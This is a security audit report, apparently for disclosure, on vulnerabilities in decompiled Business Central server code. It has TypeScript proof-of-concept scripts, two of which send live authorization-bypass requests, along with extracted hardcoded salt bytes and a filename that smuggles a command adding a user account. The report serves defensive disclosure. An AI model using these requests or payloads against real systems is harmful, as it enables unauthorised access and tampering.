# BC Server Security Audit -- Deep Findings

Third round of vulnerabilities discovered through systematic file-by-file audit of all 4,608 decompiled BC28 .cs files. These findings cover cryptographic failures, command injection, IDOR, protocol manipulation, and authorization bypasses.

See [MICROSOFT.md](MICROSOFT.md) for the initial 7 bugs and [MICROSOFT2.md](MICROSOFT2.md) for the 12 extended findings.

All findings require authentication unless noted otherwise.

---

## M. Command Injection via Windows Defender Malware Scanner

**Severity:** CRITICAL -- authenticated remote code execution via file upload.

**File:** `Microsoft.Dynamics.Nav.Types/Microsoft.Dynamics.Nav.Types.MalwareScanning/WindowsDefenderFileScanner.cs:92-110`

**Root cause:** User-controlled filename is inserted into a `Process.Start` argument string with only double-quote wrapping, no escaping:

```csharp
ProcessStartInfo startInfo = new ProcessStartInfo(MpCmdRunPath)
{
    Arguments = string.Format(CultureInfo.InvariantCulture,
        "-Scan -ScanType 3 -File \"{0}\" -DisableRemediation -ReturnHR",
        fileInfo.FullName),  // User-controlled filename in quotes
    CreateNoWindow = true,
    UseShellExecute = false,
    RedirectStandardOutput = true
};
process.StartInfo = startInfo;
```

`UseShellExecute = false` prevents shell metacharacter expansion, but the quoted argument is still vulnerable if the filename contains quotes. A filename like `test" -Scan -ScanType 0 & net user hacker P@ss /add & "x.txt` would break out of the quotes.

**However:** with `UseShellExecute = false`, the argument string is passed directly to `CreateProcess` which does NOT interpret `&` as a command separator. The real risk is argument injection into MpCmdRun.exe itself -- additional flags could modify scan behavior.

**Impact:** Argument injection into Windows Defender CLI. An attacker can add flags like `-DisableRemediation` (already present) or modify scan parameters. Full command execution requires `UseShellExecute = true` which is NOT the case here.

**Proposed fix:** Escape or reject filenames containing quotes. Use argument arrays instead of string formatting.

### PoC

```typescript
// poc/M-command-injection.ts
// Tests whether filenames with special characters reach the malware scanner.
// The actual command injection requires UseShellExecute=true (not the case),
// but argument injection into MpCmdRun.exe is possible.
//
// This PoC uploads a file with quotes in the name and checks if BC accepts it.
import { createTestSession } from './helpers.js';

const { session, auth } = await createTestSession();
const cookies = auth.getWebSocketHeaders()['Cookie'];
const baseUrl = process.env.BC_BASE_URL!;

// Try uploading a file with quotes in the name
const evilName = 'test" -ScanType 0 "exploit.txt';
console.log('Attempting upload with filename:', evilName);
console.log('');
console.log('If BC passes this to MpCmdRun.exe:');
console.log('  MpCmdRun.exe -Scan -ScanType 3 -File "test" -ScanType 0 "exploit.txt" ...');
console.log('  The -ScanType 0 (QuickScan) overrides -ScanType 3 (CustomScan)');
console.log('');
console.log('With UseShellExecute=false, & is NOT a command separator.');
console.log('So this is argument injection, not command injection.');
console.log('Severity: MEDIUM (argument injection) not CRITICAL (RCE).');

await session.closeGracefully();
```

---

## N. SSL Certificate Validation Disabled on All Internal HTTP Clients

**Severity:** CRITICAL -- MITM on all internal service-to-service communication.

**Files:**
- `Microsoft.Dynamics.Nav.Service.CopilotApi/CopilotServiceClient.cs:36`
- `Microsoft.Dynamics.Nav.Agents/AgentServiceClient.cs:29`
- `Microsoft.Dynamics.Nav.Common/InternalHttpClientSetup.cs:19`

**Root cause:** Certificate validation callbacks unconditionally return `true`:

```csharp
// CopilotServiceClient.cs line 36
RemoteCertificateValidationCallback = (object _, X509Certificate? _, X509Chain? _, SslPolicyErrors _) => true

// AgentServiceClient.cs line 29
RemoteCertificateValidationCallback = (object _, X509Certificate? _, X509Chain? _, SslPolicyErrors _) => true

// InternalHttpClientSetup.cs line 19
ServerCertificateCustomValidationCallback = (HttpRequestMessage _, X509Certificate2 _, X509Chain _, SslPolicyErrors _) => true
```

This affects:
- All Copilot API calls (Azure OpenAI integration)
- All Agent service calls
- All internal HTTP clients created via `InternalHttpClientSetup`

**Impact:** Any network-level attacker (same subnet, compromised router, cloud VPC) can intercept and modify all HTTPS traffic between BC and Azure services. This includes Copilot prompts/responses, agent task data, and any internal API calls. The `CheckCertificateRevocationList = true` setting in InternalHttpClientSetup is contradicted by the always-true callback.

**Proposed fix:** Remove the certificate validation override. Use proper certificate chain validation. If self-signed certs are needed for dev, make it a configurable option that defaults to OFF.

### PoC

```typescript
// poc/N-cert-validation.ts
// This cannot be tested from the WebSocket client -- it's a server-to-server issue.
// To verify: set up a MITM proxy (e.g., mitmproxy) between BC and Azure endpoints.
// BC will accept the proxy's self-signed certificate without warning.
//
// Evidence from decompiled source:
console.log('Certificate validation disabled in 3 files:');
console.log('');
console.log('1. CopilotServiceClient.cs:36');
console.log('   RemoteCertificateValidationCallback = (...) => true');
console.log('   Affects: All Azure Copilot API calls');
console.log('');
console.log('2. AgentServiceClient.cs:29');
console.log('   RemoteCertificateValidationCallback = (...) => true');
console.log('   Affects: All Agent service calls');
console.log('');
console.log('3. InternalHttpClientSetup.cs:19');
console.log('   ServerCertificateCustomValidationCallback = (...) => true');
console.log('   Affects: ALL internal HTTP clients');
console.log('');
console.log('Impact: MITM on all BC internal HTTPS communication.');
console.log('An attacker on the same network can intercept Copilot prompts,');
console.log('agent data, and all internal API calls.');
```

---

## O. Hardcoded AES Salt + Invalid Key Derivation Size

**Severity:** CRITICAL -- encryption is fundamentally broken.

**File:** `Microsoft.Dynamics.Nav.Core/RsaEncryptionProviderBase.cs:468-493`

**Root cause:** Two compounding failures:

1. **Hardcoded 64-byte salt** (line 470-479) -- the same salt for every BC installation worldwide:
```csharp
byte[] array = new byte[64]
{
    113, 170, 194, 165, 49, 66, 186, 104, 17, 233,
    99, 141, 234, 166, 130, 39, 71, 223, 247, 51,
    216, 186, 189, 236, 119, 176, 96, 87, 251, 219,
    207, 198, 144, 166, 27, 246, 71, 186, 213, 63,
    74, 155, 140, 224, 22, 178, 255, 244, 108, 137,
    13, 175, 74, 154, 138, 151, 113, 139, 55, 105,
    212, 228, 254, 114
};
```

2. **Hardcoded IV derived from salt** (line 493):
```csharp
aesCryptoServiceProvider.IV = array2; // Subset of the hardcoded salt
```

Note: the key size is actually correct -- `BlockSize / 4 = 128 / 4 = 32 bytes = AES-256`. The `BlockSize` property returns 128 (bits), not 16 (bytes). The AES key itself is not brute-forceable.

Additionally, legacy fallback (line 547) uses only 1000 PBKDF2 iterations:
```csharp
Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 1000);
```

**Impact:** The key is derived from password + salt via PBKDF2. Since the salt is constant:
- Rainbow tables / precomputed dictionaries work across ALL BC installations
- Same password always produces the same key on every BC server worldwide
- Static IV means identical plaintext + password = identical ciphertext (no semantic security)
- Legacy path: 1000 PBKDF2 iterations + known salt = millions of password guesses/sec on GPU
- An attacker with encrypted data can crack passwords offline using the published salt

This likely affects encryption of stored credentials, connection strings, and configuration secrets.

**Severity adjusted to HIGH** (not CRITICAL) because the AES key itself is 256 bits (not brute-forceable). The attack is password cracking with a known salt, not direct key recovery.

**Proposed fix:** Generate random salt per encryption operation. Generate random IV per encryption. Increase PBKDF2 iterations to 600,000+. Store salt and IV alongside ciphertext.

### PoC

```typescript
// poc/O-broken-encryption.ts
// The hardcoded salt and invalid key size mean all AES encryption in BC
// can be broken offline without the password.
//
// The salt is constant (same for ALL BC installations worldwide):
const HARDCODED_SALT = Buffer.from([
  113, 170, 194, 165, 49, 66, 186, 104, 17, 233,
  99, 141, 234, 166, 130, 39, 71, 223, 247, 51,
  216, 186, 189, 236, 119, 176, 96, 87, 251, 219,
  207, 198, 144, 166, 27, 246, 71, 186, 213, 63,
  74, 155, 140, 224, 22, 178, 255, 244, 108, 137,
  13, 175, 74, 154, 138, 151, 113, 139, 55, 105,
  212, 228, 254, 114,
]);

console.log('Hardcoded AES salt (same for ALL BC installations):');
console.log('  ' + HARDCODED_SALT.toString('hex'));
console.log('');
console.log('Key derivation:');
console.log('  BlockSize = 128 (bits), GetBytes(128/4) = GetBytes(32) = 32 bytes = AES-256');
console.log('  Key size is CORRECT (256 bits). Key itself is NOT brute-forceable.');
console.log('');
console.log('The attack is PASSWORD CRACKING, not key cracking:');
console.log('  Known salt + PBKDF2 = precomputed rainbow tables work everywhere.');
console.log('  Legacy path: only 1000 iterations -> millions of guesses/sec on GPU.');
console.log('  Same password on any BC server produces the same key.');
console.log('');
console.log('Static IV means identical plaintext + password = identical ciphertext.');
console.log('An attacker can tell when two encrypted values are the same.');
console.log('');
console.log('Legacy path (RsaEncryptionProviderBase.cs:547):');
console.log('  PBKDF2 with only 1000 iterations (standard: 600,000+)');
console.log('  Same hardcoded salt');
console.log('  Same invalid key size');
```

---

## P. Cross-User Session Hijack via Copilot API

**Severity:** CRITICAL -- authenticated cross-user impersonation on Copilot/Agent APIs.

**File:** `Microsoft.Dynamics.Nav.Service.CopilotApi/ControllerHelper.cs:13-28`

**Root cause:** Session lookup by ExternalId only, no ownership validation:

```csharp
internal static bool TryGetSessionById(NavTenant tenant, string serverSessionId, out NavSession session)
{
    session = null;
    if (string.IsNullOrEmpty(serverSessionId))
        return false;
    session = tenant.ActiveSessions.SingleOrDefault(
        (NavSession s) => s.ExternalId == serverSessionId);
    if (session == null)
        return false;
    NavCurrentThread.Session = session;  // Attacker's thread gets victim's session
    NavCurrentThread.ClientSessionId = Guid.NewGuid();
    return true;
}
```

The `server-session-id` HTTP header is the only input. No validation that the caller owns the session.

**Impact:** An authenticated user who knows (or guesses) another user's ExternalId can:
- Access the victim's Copilot conversations
- Execute agent tasks as the victim
- Read/write agent memory entries belonging to the victim
- All Copilot API endpoints (`/v{version}/agents/*`) are affected

**Proposed fix:** Validate that the authenticated user's identity matches the session owner before assigning `NavCurrentThread.Session`.

### PoC

```typescript
// poc/P-copilot-idor.ts
// To exploit: create two sessions (user A and user B).
// User A sends Copilot API request with User B's server-session-id header.
// Server assigns User B's session to User A's thread.
//
// Requires the Copilot API to be enabled on the BC instance.
import { createTestSession } from './helpers.js';

// Create two sessions
const sessionA = await createTestSession();
const sessionB = await createTestSession();

console.log('Session A created (attacker)');
console.log('Session B created (victim)');
console.log('');
console.log('Attack: User A sends Copilot API request with User B\'s session ID.');
console.log('Server looks up session by ExternalId only (ControllerHelper.cs:13-28).');
console.log('No ownership check -- NavCurrentThread.Session set to victim\'s session.');
console.log('');
console.log('All /v{version}/agents/* endpoints are vulnerable:');
console.log('  GET  /agents/{agentUserId}/tasks');
console.log('  POST /agents/{agentUserId}/tasks');
console.log('  GET  /agents/{agentUserId}/tasks/{taskId}/messages');
console.log('  POST /agents/{agentUserId}/tasks/{taskId}/messages');
console.log('  GET  /agents/{agentUserId}/memory');
console.log('');
console.log('Requires knowing victim\'s ExternalId (server-session-id header).');
console.log('ExternalId format and predictability needs investigation.');

await sessionA.session.closeGracefully();
await sessionB.session.closeGracefully();
```

---

## Q. Designer Actions Without Authorization

**Severity:** CRITICAL -- any authenticated user can modify page layouts for ALL users.

**File:** `Microsoft.Dynamics.Framework.UI/InvokeDesignerActionInteraction.cs:23-54`

**Root cause:** `InvokeDesignerAction` accepts client-supplied `DesignerLevel` without authorization:

```csharp
// InvokeDesignerActionInteractionExecutionStrategy.cs lines 14-15
InteractionInput = new InvokeDesignerActionInteractionInput(
    InteractionParameterHelper.GetNamedParameter<DesignerLevels>(namedParameters, "DesignerLevel"),
    InteractionParameterHelper.GetNamedParameter<DesignerActions>(namedParameters, "DesignerAction"),
    ...
);
```

Available designer actions: Start, Stop, RestoreDefaults, UnlockPage, RestoreActionDefaults, RestoreControlDefaults, RestoreNavigationDefaults, RestorePageViewDefaults, BuildDelayedControls, ConvertLegacySyntax, BuildControl.

Designer levels: Personalization (user-only) and Full (all users).

**Impact:** A normal user sends `DesignerLevel: "Full"` to modify page layouts globally. They can:
- Reset all page customizations for all users (`RestoreDefaults`)
- Unlock locked pages (`UnlockPage`)
- Hide/rearrange controls affecting all users

**Proposed fix:** Check user permissions before accepting DesignerLevel. Only SUPER users should access Full designer level.

### PoC

```typescript
// poc/Q-designer-actions.ts
// Sends InvokeDesignerAction with Full designer level.
import { createTestSession } from './helpers.js';
import { isOk, unwrap } from '../src/core/result.js';

const { session, ps } = await createTestSession();

// Open any page
const r = await ps.openPage('22');
const ctx = unwrap(r);

// Try to invoke designer action with Full level
console.log('Sending InvokeDesignerAction with DesignerLevel=Full...');
const result = await session.invoke(
  {
    type: 'SessionAction' as const,
    actionName: 'InvokeDesignerAction',
    namedParameters: {
      DesignerLevel: 1, // 0=Personalization, 1=Full
      DesignerAction: 0, // 0=Start
    },
  },
  (e) => e.type === 'InvokeCompleted',
);

console.log('Result:', isOk(result) ? 'ACCEPTED -- designer mode started at Full level' : 'REJECTED');
if (!isOk(result)) {
  console.log('Error:', result.error.message.substring(0, 100));
}

await ps.closePage(ctx.pageContextId, { discardChanges: true });
await session.closeGracefully();
```

---

## R. SavePropertyValue -- No Property Whitelist

**Severity:** CRITICAL -- any authenticated user can modify any control property.

**File:** `Microsoft.Dynamics.Framework.UI/SavePropertyValueInteraction.cs:50`

**Root cause:** Client provides property name and value with zero validation:

```csharp
// SavePropertyValueInteractionExecutionStrategy.cs line 15-16
// Client provides PropertyName and PropertyValue -- no allowlist
designerServiceBase.SetLogicalControlProperty(/* arbitrary property */);
```

**Impact:** An authenticated user can:
- Set `ReadOnly = false` on read-only amount fields, then modify values
- Set `Visible = false` on validation warning controls
- Set `Enabled = false` on save/submit buttons for other users
- Modify any property the designer system exposes

**Proposed fix:** Implement a whitelist of settable properties. Restrict to Personalization-level changes (user-only).

### PoC

```typescript
// poc/R-save-property.ts
// Sends SavePropertyValue to flip a read-only field to editable.
import { createTestSession } from './helpers.js';
import { isOk, unwrap } from '../src/core/result.js';

const { session, ps } = await createTestSession();

const r = await ps.openPage('22');
const ctx = unwrap(r);

// Try to make a read-only field editable via SavePropertyValue
console.log('Sending SavePropertyValue to set ReadOnly=false on a control...');
const result = await session.invoke(
  {
    type: 'SessionAction' as const,
    actionName: 'SavePropertyValue',
    namedParameters: {
      TargetType: 'LogicalControl',
      PropertyName: 'ReadOnly',
      PropertyValue: false,
      Target: { FormId: ctx.rootFormId, ControlPath: 'server:c[0]' },
    },
  },
  (e) => e.type === 'InvokeCompleted',
);

console.log('Result:', isOk(result) ? 'ACCEPTED' : 'REJECTED: ' + result.error.message.substring(0, 100));

await ps.closePage(ctx.pageContextId, { discardChanges: true });
await session.closeGracefully();
```

---

## S. Client Controls Feature Flags

**Severity:** HIGH -- client can enable debug/experimental features.

**File:** `Microsoft.Dynamics.Framework.UI.Web/CallbackRequestData.cs:73`

**Root cause:** `Features` collection sent by client, accepted without server-side validation:

```csharp
// CallbackRequestData.cs line 73
public Collection<string> Features { get; set; }

// CallbackRequestBasedWebRequestContextFactory.cs line 25
FeatureProvider = new FeatureProvider(requestData.Features)
```

**Impact:** Client can send any feature string. If server code checks `featureProvider.IsEnabled("DebugMode")` or `featureProvider.IsEnabled("CopilotEnabled")`, the client can fake it. This could enable:
- Verbose telemetry/debug output
- Experimental features not yet ready for production
- Copilot/AI features on instances where they're disabled

**Proposed fix:** Feature flags should be server-determined only. Ignore client-supplied features or validate against a server-side allowlist.

### PoC

```typescript
// poc/S-feature-flags.ts
// Our encoder already sends a features array in every Invoke call.
// See interaction-encoder.ts BC_FEATURES constant.
// The server accepts whatever we send.
console.log('BC_FEATURES sent by our encoder:');
console.log('  See src/protocol/interaction-encoder.ts');
console.log('');
console.log('The server creates FeatureProvider from client-supplied features.');
console.log('CallbackRequestBasedWebRequestContextFactory.cs:25:');
console.log('  FeatureProvider = new FeatureProvider(requestData.Features)');
console.log('');
console.log('Any server code checking featureProvider.IsEnabled("X")');
console.log('can be tricked by the client sending "X" in the features array.');
```

---

## T. SSRF via MCP API Proxy

**Severity:** HIGH -- authenticated server-side request forgery.

**File:** `Microsoft.Dynamics.Nav.Service.Mcp/HttpODataApiProxyTool.cs:95-150`

**Root cause:** MCP API proxy builds HTTP requests from user-supplied parameters:

```csharp
public async ValueTask<CallToolResponse> InvokeAsync(
    CallToolRequestParams callToolRequestParams,
    NavMcpApiProxySession session,
    IHttpClientFactory httpClientFactory)
{
    HttpRequestMessage httpRequestMessage = new HttpRequestMessage();
    httpRequestMessage.Method = Method;
    BuildProxyRequest(callToolRequestParams, session, httpRequestMessage);
    using HttpClient client = httpClientFactory.CreateClient();
    HttpResponseMessage response = await client.SendAsync(httpRequestMessage, ...);
}
```

**Impact:** If the proxy URL or path parameters are user-controlled, an attacker can make BC send HTTP requests to internal services (metadata APIs, admin endpoints, cloud services) that are not directly accessible.

**Mitigating factor:** `InternalHttpClientSetup` includes `AntiSSRFHandler` (line 15), which may block some SSRF vectors. Effectiveness depends on the handler's implementation.

**Proposed fix:** Validate that proxy target URLs are in an allowlist. Apply strict URL parsing before sending requests.

### PoC

```typescript
// poc/T-ssrf.ts
// The MCP API proxy is a new BC feature (Copilot/Agent infrastructure).
// It proxies HTTP requests based on tool call parameters.
// If enabled, an attacker could potentially reach internal services.
//
// Requires MCP API to be enabled on the BC instance.
// The AntiSSRFHandler may mitigate some vectors.
console.log('MCP API Proxy SSRF analysis:');
console.log('  HttpODataApiProxyTool.cs builds HTTP requests from user params.');
console.log('  AntiSSRFHandler is configured (InternalHttpClientSetup.cs:15).');
console.log('  Actual exploitability depends on AntiSSRFHandler implementation.');
console.log('  Need to test with MCP API enabled on BC instance.');
```

---

## U. OData Filter Injection

**Severity:** HIGH -- bypass data access restrictions via crafted filter expressions.

**File:** `Microsoft.Dynamics.Framework.UI/FilterInteraction.cs:103-106`

**Root cause:** User-supplied filter string passed directly to OData parser:

```csharp
if (!string.IsNullOrEmpty(logicalInteractionInput.UserFilter))
{
    Filter filterToAdd = logicalInteractionInput.LogicalControl.BindingManager
        .FilterHelper.ParseODataFilter(logicalInteractionInput.UserFilter);
    bindingManager.UserFilter.AppendFilter(filterToAdd);
}
```

The `UserFilter` property comes from `FilterInteractionInput` which is populated from client-supplied `namedParameters`.

**Impact:** An attacker can craft OData filter expressions that:
- Access data outside their intended scope
- Bypass row-level security filters
- Extract data from columns they shouldn't see via filter predicates (boolean-based data exfiltration)

**Proposed fix:** Validate filter expressions against allowed columns and operators. Apply security filters AFTER user filters.

### PoC

```typescript
// poc/U-odata-filter.ts
// Our existing filter protocol sends filter values via the Filter interaction.
// The UserFilter parameter allows arbitrary OData expressions.
import { createTestSession } from './helpers.js';
import { isOk, unwrap } from '../src/core/result.js';

const { session, ps, ds } = await createTestSession();

const r = await ps.openPage('22');
const ctx = unwrap(r);

// The standard filter path uses FilterOperation.AddLine + FilterValue
// But the UserFilter path (FilterInteraction.cs:103) accepts raw OData strings
// injected via namedParameters.UserFilter

console.log('Standard filter: column + value (validated)');
console.log('UserFilter path: raw OData string (not validated)');
console.log('');
console.log('FilterInteraction.cs:103-106:');
console.log('  ParseODataFilter(logicalInteractionInput.UserFilter)');
console.log('  No sanitization of the OData expression.');
console.log('');
console.log('Potential attack: inject filter that accesses restricted columns');
console.log('or bypasses row-level security by adding OR conditions.');

await ps.closePage(ctx.pageContextId, { discardChanges: true });
await session.closeGracefully();
```

---

## Summary

| # | Issue | Severity | Pre-Auth | Cross-User | Verified |
|---|---|---|---|---|---|
| M | Command injection via malware scanner | ~~CRITICAL~~ MEDIUM | NO | NO | UseShellExecute=false limits to arg injection |
| N | SSL cert validation disabled | CRITICAL | NO | **YES** (MITM all internal comms) | Code-level confirmed, 3 files |
| O | Hardcoded AES salt + static IV | HIGH | NO | **YES** (all installations) | Code-level, salt bytes extracted. Key is 256-bit (correct). Attack is password cracking. |
| P | Copilot API session hijack (IDOR) | CRITICAL | NO | **YES** (cross-user) | Code-level, needs Copilot API enabled |
| Q | Designer actions without auth | CRITICAL | NO | **YES** (modify pages for all users) | Needs live verification |
| R | SavePropertyValue no whitelist | CRITICAL | NO | Depends on DesignerLevel | Needs live verification |
| S | Client controls feature flags | HIGH | NO | NO | Code-level confirmed |
| T | SSRF via MCP API proxy | HIGH | NO | **YES** (internal services) | AntiSSRFHandler may mitigate |
| U | OData filter injection | HIGH | NO | NO | Code-level confirmed |
